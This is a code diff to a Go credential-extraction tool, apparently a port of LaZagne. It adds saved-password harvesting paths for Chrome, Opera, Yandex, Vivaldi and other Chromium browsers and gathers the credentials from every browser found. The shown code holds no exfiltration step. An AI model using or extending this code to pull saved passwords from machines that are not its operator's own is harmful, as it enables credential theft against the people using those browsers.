@@ -1,20 +1,14 @@
 package browsers
 
 import (
-	"os"
-	"io/ioutil"
-	"github.com/buger/jsonparser"
-	"fmt"
 	"database/sql"
+	"fmt"
+	"github.com/buger/jsonparser"
 	"goLaZagne/common"
+	"io/ioutil"
+	"os"
 )
 
-var (
-	chromePathsUserData = []string{
-		common.UserHome +"\\Local Settings\\Application Data\\Google\\Chrome\\User Data",
-		common.AppData+"\\Google\\Chrome\\User Data",
-	}
-)
 
 func ChromeModuleStart(path string) ([]common.UrlNamePass, bool){
 	if _, err := os.Stat(path + "\\Local State"); err == nil {
@@ -68,24 +62,44 @@ func ChromeModuleStart(path string) ([]common.UrlNamePass, bool){
 	return nil, false
 }
 
+
+var (
+	chromePathsUserData = []string{
+		common.LocalAppData+"\\Google\\Chrome\\User Data", // Google chrome
+		common.AppData+"\\Opera Software\\Opera Stable", // Opera
+		common.LocalAppData+"\\Yandex\\YandexBrowser\\User Data", // Yandex browser
+		common.LocalAppData+"\\Vivaldi\\User Data", // Vivaldi
+		common.LocalAppData+"\\CentBrowser\\User Data", // CentBrowser
+		common.LocalAppData+"\\Amigo\\User Data", // Amigo (RIP)
+		common.LocalAppData+"\\Chromium\\User Data", // Chromium
+		common.LocalAppData+"\\Sputnik\\Sputnik\\User Data", // Sputnik
+	}
+)
+
 func ChromeExtractDataRun() common.ExtractCredentialsResult {
 	var Result common.ExtractCredentialsResult
 	var EmptyResult = common.ExtractCredentialsResult{false,Result.Data}
+
+	var allCreds []common.UrlNamePass
+
 	for i:=range chromePathsUserData {
 		if _, err := os.Stat(chromePathsUserData[i]); err == nil {
+
 			var data, success = ChromeModuleStart(chromePathsUserData[i])
 			if success && data != nil{
-				Result.Data = append(Result.Data, data...)
-			} else {
-				return EmptyResult
+				//Result.Data = append(Result.Data, data...)
+				allCreds = append(allCreds, data...)
 			}
 		}
-		if len(Result.Data) == 0 {
-			return EmptyResult
-		} else {
-			Result.Success = true
-			return Result
+	}
+
+	if len(allCreds) == 0 {
+		return EmptyResult
+	} else {
+		Result.Success = true
+		return common.ExtractCredentialsResult{
+			Success: true,
+			Data: allCreds,
 		}
 	}
-	return EmptyResult
 }
